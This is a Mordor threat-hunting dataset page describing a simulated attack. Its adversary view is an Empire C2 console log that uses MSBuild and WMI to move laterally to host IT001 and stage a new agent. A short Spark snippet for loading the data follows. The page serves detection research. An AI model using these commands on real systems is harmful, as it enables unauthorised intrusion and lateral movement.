# Empire Invoke Msbuild

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518213907 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script |  |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz |

## Dataset Description
This dataset represents adversaries using trusted windows utilities such as msbuild to proxy execution of malicious code.

## Adversary View
```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_executemsbuild
(Empire: powershell/lateral_movement/invoke_executemsbuild) > info

              Name: Invoke-ExecuteMSBuild
            Module: powershell/lateral_movement/invoke_executemsbuild
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @xorrior

Description:
  This module utilizes WMI and MSBuild to compile and execute
  an xml file containing an Empire launcher

Comments:
  Inspired by @subtee http://subt0x10.blogspot.com/2016/09
  /bypassing-application-whitelisting.html

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  UserName     False                                 UserName if executing with credentials  
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host to target                          
  DriveLetter  False                                 Drive letter to use when mounting the   
                                                    share locally                           
  ProxyCreds   False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  FilePath     False                                 Desired location to copy the xml file on
                                                    the target                              
  Agent        True        V6W3TH8Y                  Agent to grab a screenshot from.        
  Listener     True                                  Listener to use.                        
  Proxy        False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  Password     False                                 Password if executing with credentials  

(Empire: powershell/lateral_movement/invoke_executemsbuild) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_executemsbuild) > set Listener https
(Empire: powershell/lateral_movement/invoke_executemsbuild) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 5
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_executemsbuild
(Empire: powershell/lateral_movement/invoke_executemsbuild) > 

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     : 
__DYNASTY        : __PARAMETERS
__RELPATH        : 
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         : 
__NAMESPACE      : 
__PATH           : 
ProcessId        : 6732
ReturnValue      : 0
PSComputerName   : 




[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent 38APWSR1 checked in
[+] Initial agent 38APWSR1 from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to 38APWSR1 at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_executemsbuild) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:39:49  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:39:49  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:39:47  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:39:50  https           
38APWSR1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:39:49  https           

(Empire: agents) >
(Empire: agents) > interact 38APWSR1
(Empire: 38APWSR1) > shell whoami
[*] Tasked 38APWSR1 to run TASK_SHELL
[*] Agent 38APWSR1 tasked with task ID 1
(Empire: 38APWSR1) > shire\pgustavo
..Command execution completed.

(Empire: 38APWSR1) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        